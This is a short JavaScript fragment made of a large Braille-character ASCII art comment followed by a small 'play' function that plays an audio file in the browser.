⡇⠀⠀⠀⠀⠀⣿⡀⠀⠀⣿⣷⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠃⠀⣸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⣾⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⣿⡄⠀⣠⣿⣿⣿⣿⣿⣿⠇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⢸⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠈⣧⠀⠀⠸⣿⣆⣀⣿⣿⣿⣿⣿⣿⡏⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⣿⣿⣿⣸⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠉⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⡏⠀⢹⣿⣿⣿⡏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⣿⣏⢻⣿⣿⣿⠏⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠁⠀⠈⣿⣿⣿⢣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⢻⡏⣾⣿⣿⡟⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡿⠀⠀⢀⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⢸⣷⣿⣿⣿⡇⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⣿⡇⠀⠀⢸⡇⣾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣇⣀⣀⣀⣀⣀⣀⣠⣤⣿⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⣿⢠⣿⢸⣿⠋⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣷⣷⣶⣶⣿⣿⣷⣶⣿⣿⡇⠀⠀⢸⣿⣿⢸⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⢹⣿⡏⠀⠀⢸⡿⣼⡏⣾⠇⠰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠿⠿⠿⠿⠿⠿⠿⠿⠿⠁⠀⠀⣼⣇⣿⣧⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢻⣿⣸⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠙⠿⣷⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡄⢀⣤⣤⣤⣤⣤⣤⣤⣤⣾⣇⡀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣤⡀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡴⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢰⠷⢤⣀⣠⠴⠶⣼⡇⢸⣿⢸⣿⣿⠿⠿⣿⣿⣿⡏⠽⢿⡇⠸⠦⣤⢀⣠⠶⢦⣤⡴⠶⢤⣤⠴⠦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢰⣿⠀⣿⠁⣞⣃⣹⡇⢸⣿⢸⣿⠁⣿⣦⢹⣿⣿⡇⢸⣿⡇⢸⣷⠈⣿⢰⣟⣇⣽⠀⢼⢻⠁⣛⣓⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣸⣿⣄⣿⢦⣝⣛⣿⣧⣘⣿⣌⣻⣤⣛⣧⣾⣿⣿⣧⣚⣹⣇⣾⣧⣀⠻⣬⣙⣋⣿⣄⡼⠘⢦⣝⣋⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠻⠿⠿⠿⠿⠏⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣀⡀⣀⣀⣀⣀⡀⣀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿*/
function play(audio) {

  const soundeffect = new Audio(audio);
  soundeffect.play();
}